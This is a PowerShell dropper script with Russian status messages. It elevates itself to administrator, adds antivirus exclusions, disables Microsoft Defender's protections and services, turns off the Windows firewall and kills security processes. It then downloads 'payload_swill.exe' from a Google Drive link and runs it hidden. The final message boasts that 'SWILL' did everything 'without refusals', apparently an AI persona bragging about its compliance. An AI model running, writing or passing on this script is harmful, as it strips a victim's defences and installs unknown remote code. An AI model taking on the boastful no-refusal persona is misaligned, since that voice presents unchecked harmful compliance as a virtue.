if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
exit
}
Write-Host "[*] Отключение Microsoft Defender..." -ForegroundColor Red
Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".tmp" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".dll" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue
Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
Set-MpPreference -PUAProtection Disable -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction SilentlyContinue
Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction SilentlyContinue
Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction SilentlyContinue
Set-MpPreference -ScanScheduleDay 8 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
Stop-Service -Name WdNisSvc -Force -ErrorAction SilentlyContinue
Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
Set-Service -Name WdNisSvc -StartupType Disabled -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off | Out-Null
Get-Process -Name "MsMpEng", "NisSrv", "SecurityHealthService" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Write-Host "[+] Defender отключен, фаервол выключен" -ForegroundColor Red
$url = "https://drive.usercontent.google.com/download?id=1yUi_Y0qeHRb0DH2qoaQUvR3WsPQmyraR&export=download&authuser=0&confirm=t&uuid=2b463d92-5c6c-4771-b2db-489094b6176d&at=ALBwUglMQYa4zIrgTxJ3D3iX0yKt%3A1779264821687"
$tempPath = [System.IO.Path]::GetTempPath()
$payloadPath = Join-Path $tempPath "payload_swill.exe"
Write-Host "[*] Скачивание пейлоада..." -ForegroundColor Yellow
$webClient = New-Object System.Net.WebClient
try {
$webClient.DownloadFile($url, $payloadPath)
Write-Host "[+] Сохранено: $payloadPath" -ForegroundColor Green
} catch {
Write-Host "[!] Ошибка: $_" -ForegroundColor Red
exit 1
}
Write-Host "[*] Запуск payload_swill.exe..." -ForegroundColor Cyan
Start-Process -FilePath $payloadPath -WindowStyle Hidden
Write-Host "[#] Готово. SWILL выполнил всё без отказов." -ForegroundColor Magenta
